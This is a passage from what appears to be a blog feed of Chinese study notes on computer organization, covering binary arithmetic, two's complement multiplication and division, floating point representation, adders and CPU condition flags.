补</li></ul></li><li>每次移位是 “补码的算数右移”—— 算数右移：<strong>符号位保持不动，数字右移</strong></li><li>符号位参与运算</li></ul><p>补码的一位乘法（手算模拟）</p><p>MQ 需要多一位做辅助位，辅助位初始为 0，每次右移会使 MQ 的最低位顶替原本的辅助位，随之 ACC 和 X 都是双符号位</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612100052150.png" alt="image-20220612100052150"></p><h2 id="定点数原码除法运算"><a class="markdownIt-Anchor" href="#定点数原码除法运算">#</a> 定点数原码除法运算</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612101148749.png" alt="image-20220612101148749"></p><h3 id="手算除法十进制"><a class="markdownIt-Anchor" href="#手算除法十进制">#</a> 手算除法（十进制）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612101517616.png" alt="image-20220612101517616"></p><p>手算除法（二进制）</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612101848739.png" alt="image-20220612101848739"></p><h3 id="原码除法恢复余数法"><a class="markdownIt-Anchor" href="#原码除法恢复余数法">#</a> 原码除法：恢复余数法</h3><p>符号位单独处理：被除数和除数的符号位异或</p><p>数值拉取绝对值进行除法计算</p><p>写出 x,y 的原码，y 的补码，[-y] 补</p><ul><li><p>每次上商的时候默认会商 1，然后会把 ACC 和通用寄存器的值相减后的结果再放回 ACC 中（(ACC)+[-y] 补），如果减法运算之后符号位为 1，说明此时余数小于除数，应该商 0 的，之后计算机再将上商的值改为 0，这时 ACC 的值已经放了之前的负数，要在返回原样，就要再加上除数 [y] 补，再次覆盖 ACC</p></li><li><p>把 ACC 和 MQ 的内容全部左移一位，进行一个错位，重复上述步骤</p></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103014428.png" alt="image-20220612103014428"></p><p>小数点默认在第一个 0 后面，余数 = 0.0111X2^{-n}，n=4</p><h3 id="原码除法恢复余数法手算"><a class="markdownIt-Anchor" href="#原码除法恢复余数法手算">#</a> 原码除法：恢复余数法（手算）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103403524.png" alt="image-20220612103403524"></p><h3 id="原码除法加减交替法不恢复余数法"><a class="markdownIt-Anchor" href="#原码除法加减交替法不恢复余数法">#</a> 原码除法：加减交替法（不恢复余数法）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103659376.png" alt="image-20220612103659376"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103926714.png" alt="image-20220612103926714"></p><p>思路：上商为 1 相减之后出现负数直接上商 0，然后逻辑左移，加 y 补</p><h2 id="定点数补码除法运算"><a class="markdownIt-Anchor" href="#定点数补码除法运算">#</a> 定点数补码除法运算</h2><h3 id="补码除法加减交替法"><a class="markdownIt-Anchor" href="#补码除法加减交替法">#</a> 补码除法：加减交替法</h3><ul><li>符号位直接参与运算，因此不用写绝对值的补码，直接写原数的补码</li><li>采用双符号位</li><li>被除数和除数同号，则被除数减去除数；异号则被除数加上除数</li><li>余数和除数同号，商 1，余数左移一位减去除数</li><li>余数和除数异号，商 0，余数左移一位加上除数</li><li>重复 n 次</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612104643534.png" alt="image-20220612104643534"></p><p>末位商恒置为 1</p><h2 id="除法运算总结回顾"><a class="markdownIt-Anchor" href="#除法运算总结回顾">#</a> 除法运算总结回顾</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612104845577.png" alt="image-20220612104845577"></p><h2 id="c语言类型转换"><a class="markdownIt-Anchor" href="#c语言类型转换">#</a> C 语言类型转换</h2><p>C 语言中的定点整数，如 int short long 都是用<strong>补码</strong>存储的</p><p>unsigned 表示无符号整数</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612133529322.png" alt="image-20220612133529322"></p><h2 id="数据的存储和排列"><a class="markdownIt-Anchor" href="#数据的存储和排列">#</a> 数据的存储和排列</h2><h3 id="大小端模式"><a class="markdownIt-Anchor" href="#大小端模式">#</a> 大小端模式</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612142235582.png" alt="image-20220612142235582"></p><p>大端：将高有效字节放在低地址，适合人类阅读</p><p>小端：将高有效字节放在高地址，适合机器处理</p><h3 id="边界对齐"><a class="markdownIt-Anchor" href="#边界对齐">#</a> 边界对齐</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612142441722.png" alt="image-20220612142441722"></p><p>转换地址就逻辑左移右移即可，每次访存只能读取一个字，且不能跨行读取</p><h2 id="浮点数的表示"><a class="markdownIt-Anchor" href="#浮点数的表示">#</a> 浮点数的表示</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612143258457.png" alt="image-20220612143258457"></p><p>定点数的局限性：当所需表示的数值较大时，定点数就不能正确表示</p><p>定点数可表示的数字范围有限，但我们不能无限制地增加数据的长度</p><p>科学计数法：+11+3.026</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612143558714.png" alt="image-20220612143558714"></p><p>尾数部分越短能表示的精度就越低，阶码表示对应进制的多少次方</p><ul><li>阶码反映数值的大小，尾数反映精度</li></ul><h3 id="浮点数的表示-2"><a class="markdownIt-Anchor" href="#浮点数的表示-2">#</a> 浮点数的表示</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612144203332.png" alt="image-20220612144203332"></p><ul><li>r: 进制，E：阶码；M：尾数</li></ul><h3 id="浮点数尾数的规格化"><a class="markdownIt-Anchor" href="#浮点数尾数的规格化">#</a> 浮点数尾数的规格化</h3><p>尾数的最高位如果是 0 就没有意义，是无效值，会丧失精度</p><p><strong>左规</strong>：当浮点数运算的结果为非规格化时要进行规格化处理，将<strong>尾数算数左移一位，阶码减 1</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612144701482.png" alt="image-20220612144701482"></p><p><strong>右规</strong>：当浮点数运算结果的尾数出现溢出（双符号位为 01 或 10,）时，将<strong>尾数算数右移一位，阶码加 1</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612145037770.png" alt="image-20220612145037770"></p><p>注：采用双符号位，当溢出发生时，可以挽救。更高的符号位是正确符号位</p><h3 id="规格化浮点数的特点"><a class="markdownIt-Anchor" href="#规格化浮点数的特点">#</a> 规格化浮点数的特点</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612145524638.png" alt="image-20220612145524638"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612145611648.png" alt="image-20220612145611648"></p><h2 id="浮点数标准ieee-754"><a class="markdownIt-Anchor" href="#浮点数标准ieee-754">#</a> 浮点数标准 IEEE 754</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;移位运算&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#移位运算&quot;&gt;#&lt;/a&gt; 移位运算&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-2</summary>
      
    
    
    
    <category term="计算机组成原理" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机组成原理" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="408" scheme="http://example.com/tags/408/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理-数据的表示和运算</title>
    <link href="http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97.html"/>
    <id>http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97.html</id>
    <published>2022-06-11T03:21:41.000Z</published>
    <updated>2022-06-12T01:14:21.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id="无符号整数的表示和运算"><a class="markdownIt-Anchor" href="#无符号整数的表示和运算">#</a> 无符号整数的表示和运算</h2><h3 id="无符号整数的加法"><a class="markdownIt-Anchor" href="#无符号整数的加法">#</a> 无符号整数的加法</h3><p>按位相加</p><h3 id="无符号整数的减法"><a class="markdownIt-Anchor" href="#无符号整数的减法">#</a> 无符号整数的减法</h3><ol><li>被减数不变，减数全部按位取反，末位 + 1，减法变加法</li><li>从最低位开始，<strong>按位相加</strong>，并往更高位进位</li></ol><h2 id="带符号整数的表示和运算-原反补"><a class="markdownIt-Anchor" href="#带符号整数的表示和运算-原反补">#</a> 带符号整数的表示和运算 - 原反补</h2><h3 id="补码的加法运算"><a class="markdownIt-Anchor" href="#补码的加法运算">#</a> 补码的加法运算</h3><p>当负数参与加法运算时，要将两个数全部取补码，符号位也参与运算，不需要单独处理</p><h3 id="补码的减法运算"><a class="markdownIt-Anchor" href="#补码的减法运算">#</a> 补码的减法运算</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>A</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>−</mo><mo stretchy="false">[</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mo stretchy="false">[</mo><mi>A</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>+</mo><mo stretchy="false">[</mo><mo>−</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub></mrow><annotation encoding="application/x-tex">[A]_补-[B]_补=[A]_补+[-B]_补</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub></mrow><annotation encoding="application/x-tex">[B]_补</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>转<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub></mrow><annotation encoding="application/x-tex">[-B]_补</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>：全部位按位取反（包括符号位），末位加 1</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611112652422.png" alt="image-20220611112652422"></p><p>或者：找第一个 1，左边全部取反，右边不变</p><p><strong>例 1</strong>：19-19</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611112953017.png" alt="image-20220611112953017"></p><p><strong>C 语言中 int 等带符号整数是用补码来表示的</strong></p><h3 id="原反补码特性对比"><a class="markdownIt-Anchor" href="#原反补码特性对比">#</a> 原 / 反 / 补码特性对比</h3><p>小题常见考点</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611113453517.png" alt="image-20220611113453517"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611113510474.png" alt="image-20220611113510474"></p><p>原码和反码的合法表示范围完全相同，都有两种方法表示真值 0；</p><p><strong>补码</strong>的合法表示范围比原码多一个负数，只有一种方式表示真值 0：</p><ul><li>如果有 8 个比特，原码和反码能够表示 - 127~127，补码可以表示 - 128~127</li><li>补码中 - 128 的表示为：1,0000000；</li><li>原码能表示的最小的值 - 127：1,1111111；</li><li>-128 不能转为 - 127</li><li>补码的真值 0 表示方法：0,0000000</li></ul><p>常见考点：A 和 B 进行某种运算后，<strong>是否发生溢出</strong> —— 手算做题可以带入十进制验证是否超出合法范围</p><h3 id="移码表示"><a class="markdownIt-Anchor" href="#移码表示">#</a> 移码表示</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215129431.png" alt="image-20220611215129431"></p><p>移码：在<strong>补码</strong>的基础上<strong>符号位取反就是移码</strong>，移码只能用来表示整数</p><p>移码的合法表示范围和补码相同，也只能有一种表示真值 0 的形式，[0] 移 = 10000000</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215355189.png" alt="image-20220611215355189"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215414718.png" alt="image-20220611215414718"></p><h2 id="定点小数的表示和运算"><a class="markdownIt-Anchor" href="#定点小数的表示和运算">#</a> 定点小数的表示和运算</h2><p>定点：小数点的符号固定</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215542709.png" alt="image-20220611215542709"></p><h3 id="定点小数反码-补码的转换"><a class="markdownIt-Anchor" href="#定点小数反码-补码的转换">#</a> 定点小数反码、补码的转换</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215716021.png" alt="image-20220611215716021"></p><h3 id="定点小数的加减运算"><a class="markdownIt-Anchor" href="#定点小数的加减运算">#</a> 定点小数的加 / 减运算</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215735571.png" alt="image-20220611215735571"></p><h3 id="定点小数与定点整数的区别"><a class="markdownIt-Anchor" href="#定点小数与定点整数的区别">#</a> 定点小数与定点整数的区别</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215815635.png" alt="image-20220611215815635"></p><p>定点小数在位数扩展时，<strong>拓展位置</strong>不一样，要加在右边</p><p>定点小数带符号与不带符号的加法减法与定点整数一样</p><h2 id="奇偶校验码"><a class="markdownIt-Anchor" href="#奇偶校验码">#</a> 奇偶校验码</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611220446249.png" alt="image-20220611220446249"></p><p><img src="C:/Users/a1072/AppData/Roaming/Typora/typora-user-images/image-20220611220742364.png" alt="image-20220611220742364"></p><h2 id="算术逻辑单元alu"><a class="markdownIt-Anchor" href="#算术逻辑单元alu">#</a> 算术逻辑单元 ALU</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611220827090.png" alt="image-20220611220827090"></p><ul><li>算术运算：加减乘除等</li><li>逻辑运算：与或非异或等</li><li>辅助功能：移位、求补等</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611220948204.png" alt="image-20220611220948204"></p><h3 id="最基本的逻辑运算"><a class="markdownIt-Anchor" href="#最基本的逻辑运算">#</a> 最基本的逻辑运算</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611221246766.png" alt="image-20220611221246766"></p><p>在一个复杂的逻辑表达式中，<strong>与运算的优先级大于或运算的优先级</strong> —— 类比乘法和加法，先算与再算减，且与或运算也符合下面规律</p><ul><li>A (C+D) = AC + AD —— 分配率</li><li>ABC = A (BC) —— 结合律</li><li>A + B + C = A + (B + C) —— 结合律</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611221708902.png" alt="image-20220611221708902"></p><p>本质上逻辑表达式是对电路的数学描述，简化逻辑表达式就是在简化电路设计</p><h3 id="复合逻辑"><a class="markdownIt-Anchor" href="#复合逻辑">#</a> 复合逻辑</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611222247264.png" alt="image-20220611222247264"></p><p>与非就是先与再非，或非就是先或再非</p><p>反演律：</p><ul><li>A 或 B 的非等于 A 的非与 B 的非</li><li>A 与 B 的非等于 A 的非或 B 的非</li></ul><p>同或 ： 异或取反</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611222312945.png" alt="image-20220611222312945"></p><h3 id="用门电路求偶校验位"><a class="markdownIt-Anchor" href="#用门电路求偶校验位">#</a> 用门电路求偶校验位</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611222527248.png" alt="image-20220611222527248"></p><h3 id="一位全加器"><a class="markdownIt-Anchor" href="#一位全加器">#</a> 一位全加器</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223042793.png" alt="image-20220611223042793"></p><h3 id="串行加法器"><a class="markdownIt-Anchor" href="#串行加法器">#</a> 串行加法器</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223245264.png" alt="image-20220611223245264"></p><h3 id="串行进位的并行加法器"><a class="markdownIt-Anchor" href="#串行进位的并行加法器">#</a> 串行进位的并行加法器</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223308335.png" alt="image-20220611223308335"></p><p>串行进位又称为行波进位，每一级进位直接依赖于前一级的进位，级进位信号是逐级形成的</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611223419366.png" alt="image-20220611223419366"></p><h3 id="并行进位加法器"><a class="markdownIt-Anchor" href="#并行进位加法器">#</a> 并行进位加法器</h3><p>以上的串行进位的并行加法器，下一位的结果都依赖于上一位 C 的输出，只有上一位的运算结果出来以后下一位才能进行运算，运算速度还是受进位信息产生速度的影响。</p><p>每个进位产生的逻辑表达式:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><msub><mi>B</mi><mi>i</mi></msub><mo>+</mo><mo stretchy="false">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo>⨁</mo><msub><mi>B</mi><mi>i</mi></msub><mo stretchy="false">)</mo><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_i = A_iB_i + (A_i \bigoplus B_i )C_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>，依赖于两个本位的数值和来自低位的进位，Ci-1 可以继续进行展开</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611224122561.png" alt=""></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611224449416.png" alt="image-20220611224449416"></p><p>这种加法器的设计每个位的进位几乎是同时产生的</p><p>不足：位数越多电路表达式会越复杂，一般最高到 4 位加 4 位的运算</p><h3 id="补码加减运算器"><a class="markdownIt-Anchor" href="#补码加减运算器">#</a> 补码加减运算器</h3><p>加法器原理</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612084603472.png" alt="image-20220612084603472"></p><p>补码加 / 减法运算</p><ul><li>n bit 补码 X+Y，按位相加即可</li><li>n bit 补码 X-Y：将补码 Y 全部按位取反，末位 + 1，得到 [-Y] 补，减法变加法</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612085110066.png" alt="image-20220612085110066"></p><p>无符号整数的加 / 减法也可以用该电路实现</p><ul><li>无符号数 X+Y，按位相加即可</li><li>无符号整数 X-Y，将 Y 全部按位取反，末位 + 1，减法变加法</li></ul><p>补码加减运算和无符数的加减运算都可以用<strong>同一个运算器</strong>实现，但是<strong>溢出位</strong>的判断不同</p><p>所以底层的硬件都是同一套逻辑，不管给的数是有符号还是无符号，因此溢出判断要进行处理</p><h3 id="标志位的生成"><a class="markdownIt-Anchor" href="#标志位的生成">#</a> 标志位的生成</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612090128363.png" alt="image-20220612090128363"></p><p>加法器输出四个标志位的信息</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612090054927.png" alt="image-20220612090054927"></p><p>OF：溢出标志，只在<strong>有符号数的加减运算</strong>时有效（无符号运算时即使 OF=1，也不能说明发生了溢出）</p><ul><li>OF 的硬件逻辑：OF = 最高位的进位异或次高位的进位</li><li>在有符号整数的运算中，如果发生了溢出，可以判断这个运算结果是错误的</li></ul><p>SF：符号标志，运算结果为正则置为 0，结果为负则置为 1</p><ul><li>SF 的硬件计算方法：SF = 最高位的本位和</li><li>SF 位对无符号数的加减法无意义</li></ul><p>ZF：零标志，运算结果为 0 时 ZF 置为 1，否则为 0</p><ul><li>对有符号数和无符号数都有意义</li></ul><p>CF：进位 / 错位标志，进位 / 错位时置 1，否则置 0</p><ul><li>CF 表示无符号数的加减法是否发生了进位或错位，只对无符号数有意义，对有符号数无意义</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091019254.png" alt="image-20220612091019254"></p><ul><li>产生借位意思为被减数不够减，要向上一位借一位，所以发生 CF 时结果是错误的，就是产生了溢出</li></ul><p><strong>有符号</strong>整数加减运算是否产生了溢出要看 OF 位，<strong>无符号</strong>整数加减运算是否产生溢出要看<strong> CF</strong> 位</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;无符号整数的表示和运算&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#无符号整数的表示和运算&quot;&gt;#&lt;/a&gt; 无符号整数的表示和运算&lt;/h2&gt;
&lt;h3 id=&quot;无符号整数的加法&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; </summary>
      
    
    
    
